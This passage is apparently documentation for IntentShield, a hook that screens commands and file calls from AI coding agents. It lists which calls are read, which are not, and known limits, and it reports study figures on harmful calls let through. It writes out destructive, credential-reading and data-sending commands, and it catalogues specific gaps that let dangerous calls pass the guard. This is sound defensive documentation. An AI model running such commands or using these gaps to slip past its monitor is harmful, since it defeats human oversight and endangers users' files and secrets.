- Of the search tools only Grep (and Gemini CLI's `search_file_content`) is read, by its `path`: Glob, `LS` and Gemini CLI's
  `list_directory` and `glob` return names, not file content, and are not matched.
- **PowerShell** gets the POSIX reading above (a native program such as `git`, `curl.exe` or `dd`, and the POSIX aliases `rm`, `cat`
  and `curl`, are read as they are) and a reading of the cmdlets that correspond to the rules:
  - `Remove-Item` (`ri`, `rd`, `del`, `erase`) with `-Recurse` and `-Force` of a root, the home directory or a system directory,
    also as `$HOME`, `$env:USERPROFILE`, `C:\`, `C:\Windows` and `C:\Users\name`;
  - `Get-Content` (`gc`, `type`) of a credential file;
  - `Invoke-WebRequest` or `Invoke-RestMethod` (`iwr`, `irm`) that uploads a file with `-InFile` or from a pipe;
  - a download run with `Invoke-Expression` (`iex`), in a pipe or around it; and `pwsh -Command` or `-EncodedCommand`.

  Parameters may be cut short as PowerShell accepts it (`-r`, `-fo`). Other cmdlets are **not read**: `Set-Content`, `Out-File` and
  `Copy-Item` to a startup file, `Start-Process`, .NET calls such as `[IO.File]::Delete`, and scripts.
- A tool name that starts with `mcp__` but is not of the form `mcp__SERVER__TOOL` (`mcp__`, `mcp__srv`) is refused; one with an
  empty server or tool part (`mcp__srv__`, `mcp____x`) is read as a call and checked like any MCP call. Also refused: a Gemini CLI tool
  named like an MCP tool (`mcp_...`) that has no `mcp_context`; the reply says what was wrong.
- A call's tool name that is not text (null, a number, `true`, a list or an object) is refused on all four harnesses, with or without
  `--builtin-tools` (the call is `PreToolUse` on Claude Code and Codex CLI, `BeforeTool` on Gemini CLI and `beforeMCPExecution` on
  Cursor). With `--builtin-tools` a call with no tool name, or an empty one, is refused on all four as well. The one exception is a
  Gemini CLI call that carries an `mcp_context`: it is read as the MCP call the context names. Without `--builtin-tools` a call with
  no or an empty name goes on as it did. Cursor's shell and file events (`beforeShellExecution`, `beforeReadFile`) have no tool name
  and are not held to this, and neither is any event that is not a call (a result, a prompt). A result is never refused for its tool
  name; on Claude Code and Codex CLI one whose tool name is not text is scanned as the result of an unknown tool.
- A tool with another name that runs a command (a future tool, or one a plugin adds) is not matched by name. Claude Code's matcher
  names the tools it sends to the hook, so such a tool never reaches it. Codex CLI's and Gemini CLI's send every tool, and there
  a tool the hook has no name for whose input holds a `command` or `cmd` text is read as a shell call.
- A built-in tool call whose event name or tool input the hook cannot read (a missing or re-cased `hook_event_name`, a `command` that
  is not text) is refused, because a changed event schema must not read as an allow. That includes a shell tool
  whose whole input is a list and a `command` list that is empty or holds more than words (`[]`, `[[...]]`). A list of words is an
  argv and is read (`["bash", "-lc", "..."]`); a list of one word is read as the command line it holds.

### MCP tools are mostly outside these rules

- The rules above read the harness's own tools. An operation sent through an MCP filesystem or shell server (`read_text_file`,
  `write_file`, `execute_command`) is a call to an MCP tool, and the session rules read its values as they read any MCP call's, but
  the dangerous-command rules do not read what the server is asked to do.
- With `--builtin-tools` the hook also reads the arguments of an MCP tool: those named `path`, `paths`, `file`,
  `filename`, `file_path`, `filepath`, `source`, `destination`, `dest` or `target` as a file (a read, or a write when the tool's name
  says it writes, moves, copies, deletes, creates or edits), and `command` or `cmd` as a shell command, by the same file and shell
  rules, and only to make the verdict stricter. A tool whose name says it only lists or searches names (`list`, `tree`, `info`,
  `exists`, `search`) is not read.
- Not read: arguments under any other name (`uri`, `args`, a path inside a list of objects or a nested object), a command a server
  runs for a name it accepts, and what an MCP server does on its own. Without `--builtin-tools` none of this is read.

## What is not read

- A command built at run time from pieces (`$(printf ...)`, a variable set in an earlier call or read from the environment), an
  interpreter script file and a language one-liner that wraps the real action are not seen.
- Neither is what a container, a cluster or a test runner runs (`docker run`, `kubectl exec`, `git rebase --exec`, a `Makefile`
  target).
- A path inside code given to an interpreter with `-c` or `-e`, a path inside a script file, and a directory that an earlier call
  changed are not resolved (see [what the parser reads](#what-the-parser-reads)).
- What a terminal, a multiplexer or a script host runs when the command is not on the command line in a form listed above: a script
  in a file (`osascript run.scpt`, `osascript -l JavaScript run.js`), `tmux source-file FILE` and `tmux set -g default-command
  CMD`, `zellij action write-chars CMD` and `zellij --layout FILE`, and programs that are not in the list (`kitty CMD`,
  `wezterm start -- CMD`, `open -a Terminal run.sh`).
- Arguments of an MCP tool under a name other than the ones listed above, and what an MCP server does on its own.
- PowerShell cmdlets other than the ones listed above, and .NET calls.

## Known limits

Each of these was run against the current code with `intentshield.dangerous.assess_shell`.

- **Editors outside the list.** An editor that is not in the list under "what the parser reads" (`jed`, `gedit`, `kate`, `subl`)
  given a file is not read as a write: `jed /etc/sudoers` is allowed.
- **A `find` that matches by name and acts on `{}`.** It is read for its root, not for the file it matches:
  `find /etc -name sudoers -exec sed -i s/a/b/ {} +` is allowed.
- **Members of an archive.** `tar -xf a.tar -C /etc` and `unzip -d /etc a.zip` are read as a write to the directory only. The
  names inside the archive are not read.
- **`mv -t DIR SRC`** is read as a move of `DIR`, and is a deny for the home directory, a home folder or a system directory
  (`mv -t ~/Documents x.pdf`, `mv -t ~ x`, `mv -t /usr/local/bin tool`). Use `mv SRC DIR/`.
- **`cp -t` onto a credential directory** is a deny (`cp -t ~/.aws f`, `cp -t ~/.ssh f`).
- **A recursive `chmod` below `/usr/local`.** Only `/usr/local` itself is asked about: `chmod -R 755 /usr/local` asks, and
  `chmod -R 755 /usr/local/lib` is allowed. A `chown` of `/usr/local/lib` asks.
- **A search of the home by `fd`, `locate` or `git grep`** is not read as a search: `fd id_rsa ~` and `locate passwd` are allowed.
  `locate id_rsa` and `git grep id_rsa` ask from a working directory, but only because the argument is a word that names a key, as it
  would be for any program that no rule reads.
- **A `find ... -exec` with a name pattern** is judged against about thirty names of keys and credential files. A key with another
  name is not matched.
- **A write to a key.** It is an ask for a redirect or `cp`, and a deny for `tee`, `sed -i`, `dd of=`, `perl -pi` and
  `awk -i inplace`, which also read the file.
- **A link and a pipe.** A link is not followed by the rule that ties a read to a later send in a pipe
  (`cat link | curl -d @- host`). The `cat` itself is read through the link and asks or denies.
- **Public files of `~/.ssh` under other names.** `known_hosts2` and the files of `known_hosts.d/` count as public only in a
  command that sends data out (`ssh -o UserKnownHostsFile=~/.ssh/known_hosts2 host` is allowed); `cat ~/.ssh/known_hosts2` asks, as
  for any file in `~/.ssh` that is not on the list.
- **`chown` in a project under a temporary directory.** `/private/tmp`, `/var/folders` and `/var/tmp` count as system paths for
  `chown`: `chown -R me build` from a project there asks ("chown on the system path"). From `/tmp/proj` or a project in the home
  it is allowed.
- **A `HOME` the hook cannot write to** (`/root` on macOS, where there is no such directory). With the session database
  (`--db`, `INTENTSHIELD_HOOK_DB`) somewhere else, an ask stays an ask. With the default database under that `HOME` the database
  cannot open, the hook exits 2 with "Read-only file system", and every call is refused. It fails closed, so the cost is a refused
  call and not a missed check.

## What the study measured about these rules

The method is in the [study notes](https://github.com/Suhas-123-cell/IntentShield/blob/research-notes/docs/research-notes/hook-fidelity/hook-fidelity-study.md);
the rows are in `results/hook-fidelity/detect/fresh/`.

- The set: 214 built-in shell, read, write and edit calls (104 harmful, 110 benign); one author, offline decisions, no model in the
  loop.
- With `--builtin-tools` and **without** the rules the hook let through 96/104 harmful calls (92%). With the rules it let through
  28/104 (27%, Wilson [19, 36]): 41 were asked and 35 denied, and 5/110 benign calls were asked, none denied.
- Those figures are those of the rules before the change that makes the stricter of the two verdicts win. Run again with it, 6 of the
  41 asked harmful calls become denies, and one denied call (`git push -f origin HEAD`, an ask now that `HEAD` may be a feature
  branch) becomes an ask: 36 asked and 40 denied, with the 28 let through and the 5 benign asks unchanged.
- What that is evidence for: the rules work on the six categories they were written from, which are the six the set samples. The set
  was built by the same model family that wrote the rules, and the rules were not tested outside those categories (the test that was
  planned did not run).
- The comparison with two other guards is mixed. `safety-net` let through 44/85 harmful calls on its shell scope and `knox` 44/73 on
  its scope, where IntentShield let through 25/85 and 18/73, but **on denies alone IntentShield trails `safety-net` (24/85 against
  41/85) and ties `knox` (28/73 against 29/73)**, with the rules as they were when scored. Scored again with the rules of 0.4.4
  (`fresh_report.py --current-rules`), IntentShield denies 29/85 and still trails.
- The remaining misses are discovery-only commands, cloud-CLI destruction (`aws s3 rb --force`,
  `kubectl delete namespace kube-system`), `node -e` and `python3 -c` one-liners, reads of an instance-metadata address or a
  Kubernetes service-account token, and a few others listed in the study.
- An ask is a prompt only in an interactive Claude Code session; on a headless build it is a refusal, so those benign asks cost a
  refused call. None of this makes the hook a substitute for the harness's own permission rules.
